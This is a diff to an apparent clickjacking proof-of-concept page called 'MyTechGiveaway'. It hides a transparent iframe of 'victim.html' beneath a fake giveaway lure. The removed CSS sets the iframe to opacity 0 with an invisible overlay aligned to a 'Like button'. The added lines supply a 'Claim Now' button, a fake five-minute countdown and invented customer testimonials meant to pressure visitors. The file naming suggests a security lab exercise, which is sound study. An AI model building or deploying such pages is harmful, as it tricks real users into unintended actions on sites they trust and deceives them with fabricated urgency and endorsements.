@@ -3,94 +3,50 @@
   <head>
     <meta charset="UTF-8" />
     <title>MyTechGiveaway</title>
-    <style>
-      body {
-        overflow: hidden;
-        margin: 0;
-      }
-
-      .frame-wrapper {
-        position: relative;
-        width: 100%;
-        height: 100vh;
-        overflow: hidden;
-      }
-
-      iframe {
-        position: absolute;
-        top: -120px;
-        left: 250px;
-        width: 1200px;
-        height: 100%;
-        border: none;
-        opacity: 0;
-        pointer-events: auto; /* Allow interaction when needed */
-        z-index: 3;
-      }
-
-      .clickbait-content {
-        opacity: 1;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: white;
-        border-radius: 12px;
-        padding: 40px;
-        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
-        z-index: 2;
-        text-align: center;
-      }
-
-      .clickbait-content h1 {
-        color: #007bff;
-        margin-bottom: 15px;
-      }
-
-      .clickbait-content p {
-        margin-bottom: 25px;
-      }
-
-      .fake-btn {
-        padding: 12px 25px;
-        background-color: #28a745;
-        color: white;
-        font-size: 18px;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-      }
-
-      /* Make iframe clickable only on target area */
-      .iframe-overlay {
-        position: absolute;
-        top: 350px; /* Adjust to align with like button */
-        left: 545px;
-        width: 140px;
-        height: 50px;
-        z-index: 1;
-        opacity: 0;
-        background-color: red;
-        pointer-events: auto;
-      }
-    </style>
+    <link rel="stylesheet" href="attacker.css" />
   </head>
   <body>
     <div class="frame-wrapper">
       <iframe src="victim.html"></iframe>
-
-      <!-- Invisible clickable region over Like button -->
-      <div class="iframe-overlay"></div>
-
       <!-- Visible Content -->
       <div class="clickbait-content">
-        <h1>🎉 Congratulations!</h1>
-        <p>
-          You’ve been selected for an exclusive tech giveaway. Click below to
-          claim your free device!
-        </p>
+        <img
+          src="https://dummyimage.com/200x50/007bff/ffffff&text=MyTechGiveaway"
+          alt="Logo"
+          class="logo"
+        />
+        <h1>🎉 You're Invited!</h1>
+        <p>You've qualified for our exclusive tech drop event!</p>
+        <img
+          src="https://dummyimage.com/250x200/eeeeee/000000&text=Free+Phone"
+          alt="Prize"
+          class="prize-img"
+        />
+        <p class="timer">Offer expires in: <span id="countdown">04:59</span></p>
         <button class="fake-btn">Claim Now</button>
+
+        <div class="testimonials">
+          <p><strong>Ravi:</strong> Just claimed mine. Fast & easy!</p>
+          <p><strong>Sneha:</strong> I didn’t believe it at first 😍</p>
+          <p><strong>Vikram:</strong> Thanks MyTechGiveaway!</p>
+        </div>
       </div>
     </div>
+
+    <script>
+      let seconds = 299;
+      const timer = document.getElementById("countdown");
+
+      setInterval(() => {
+        if (seconds >= 0) {
+          const m = Math.floor(seconds / 60);
+          const s = seconds % 60;
+          timer.textContent = `${String(m).padStart(2, "0")}:${String(
+            s
+          ).padStart(2, "0")}`;
+          seconds--;
+        }
+      }, 1000);
+    </script>
   </body>
 </html>
